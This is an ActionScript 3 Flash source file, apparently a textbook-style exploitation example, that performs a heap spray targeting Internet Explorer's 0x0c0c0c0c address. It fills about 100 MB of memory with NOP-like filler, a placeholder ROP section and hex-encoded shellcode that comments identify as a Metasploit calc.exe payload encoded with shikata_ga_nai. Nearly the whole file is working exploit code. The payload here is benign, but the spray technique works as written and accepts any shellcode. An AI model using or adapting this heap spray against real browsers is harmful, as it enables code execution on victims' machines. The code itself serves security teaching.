package 
{
    import flash.display.*;
    import flash.utils.*;


    public class spray extends MovieClip
    {

      public var allocate:Array;
	
      public function spray()
      {
          HeapSpray();    
      }


      public function hexToBin(inputcode:String) : ByteArray
      {
          var codestr:String = null;
          var codestart:uint = 0;
          var codelen:uint = inputcode.length;
          var codeblock:ByteArray = new ByteArray();
          codeblock.endian = Endian.LITTLE_ENDIAN;
			
          while(codestart < codelen)
          {
              codestr = inputcode.charAt(codestart) + (inputcode.charAt(codestart + 1));
              codeblock.writeByte(parseInt(codestr, 16));
              codestart = codestart + 2;
          }
          return codeblock;
      }


      public function HeapSpray() : void
      {
          var chunk_size:uint = 1048576;      // 0x100000 	  
          var block_size:uint = 32768;        // 0x8000   
          var heapblocklen:uint = 0;
          var spraychunks:uint = 0;
          var stackalign:uint = 0;
          var heapblock1:ByteArray;
          var heapblock2:ByteArray;
          var heapblock3:ByteArray;

//  ruby msfpayload windows/exec CMD=calc.exe exitfunc=seh R 
//  | ruby msfencode -e x86/shikata_ga_nai -b '\x00' -t perl
//  [*] x86/shikata_ga_nai succeeded with size 227 (iteration=1)

          var code:String = 

         "ddc5bd40e7d9d1d97424f45829c9" + 
         "b13383e8fc3168130328f43b2454" +  
         "1232c7a4e3254141d27735024748" +  
         "3d4664231372ff41bc7548ef9ab8" +  
         "49c122168943df64dea3dea713a5" +  
         "27d5dcf7f0924fe875e653095a6d" +  
         "eb71dfb198cbdee13147a819390f" +  
         "0918ee5375539ba00d624df9ee55" +  
         "b156d15a3ca6155cdfdd6d9f62e6" +  
         "b5e2b86328444ad388759f825b79" +  
         "54c0049d6b053f99e0a89028b28e" +  
         "347160ae6ddfc7cf6e87b875e425" +  
         "ac0ca723339cdd0a339edd3c5caf" +  
         "56d31b30bd90dac10c0c4a78e56d" +  
         "167bd3b12ff8d649d4e0924c90a6" +  
         "4f3c89427093aa461372390afa11" +  
         "b9a902";


          heapblock1 = new ByteArray();
          heapblock1.endian = Endian.LITTLE_ENDIAN;

          while(heapblocklen < 3084)           // our offset points to 0x0c0c0c0c for IE
          {
              heapblock1.writeByte(0x0c);      // fill junk          
              heapblocklen = heapblocklen + 1;
          }

// ROP chain example

          heapblock1.writeInt(0x59415247);//GRAY   
          heapblock1.writeInt(0x20544148);//HAT   
          heapblock1.writeInt(0x4B434148);//HACK   
          heapblock1.writeInt(0x21474E49);//ING!   
          heapblock1.writeInt(0x41414141);   
          heapblock1.writeInt(0x41414141);   
          heapblock1.writeInt(0x41414141);   
          heapblock1.writeInt(0x41414141);   

          heapblock1.writeBytes(hexToBin(code));

          heapblocklen = heapblock1.length;

          while(heapblocklen < block_size)         
          {
              heapblock1.writeByte(0x0d);     // fill junk          
              heapblocklen = heapblocklen + 1;
          }

          heapblock2 = new ByteArray();

          while(heapblock2.length < chunk_size)  
          {
              heapblock2.writeBytes(heapblock1, 0, heapblock1.length);
          }
		
          allocate = new Array();

          while(spraychunks < 100)
          {
              heapblock3 = new ByteArray();
              heapblock3.writeBytes(heapblock2, 0, heapblock2.length);
              allocate.push(heapblock3);
              spraychunks = spraychunks + 1;
          }
      }
    }
}

